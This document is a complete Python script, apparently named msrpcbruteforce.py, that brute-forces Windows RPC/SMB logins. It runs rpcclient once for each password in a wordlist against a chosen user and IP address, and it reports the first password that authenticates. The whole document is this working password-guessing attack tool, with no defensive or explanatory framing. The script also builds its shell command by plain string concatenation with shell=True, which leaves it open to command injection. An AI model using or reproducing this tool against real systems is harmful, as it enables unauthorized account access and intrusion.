import subprocess
import sys

if len(sys.argv) != 4:
    print("Usage: python3 msrpcbruteforce.py <user> <IP> <pathtowordlist>")
    sys.exit()

user=sys.argv[1]
ip=sys.argv[2]
wordlist=open(sys.argv[3],"r").readlines()
for passwd in wordlist:
    passwd=passwd.strip()
    x=subprocess.Popen("rpcclient -U "+user+"%"+passwd+" "+ip+" -c srvinfo", shell=True, stdout=subprocess.PIPE)
    result = x.communicate()[0].decode('utf-8')
    if "NT_STATUS_LOGON_FAILURE" in result:
       pass
    elif "platform_id" in result:
       print("Success with: "+user+":"+passwd)
       sys.exit()
print("[-] No results found for user: "+user+" and wordlist: "+sys.argv[3])
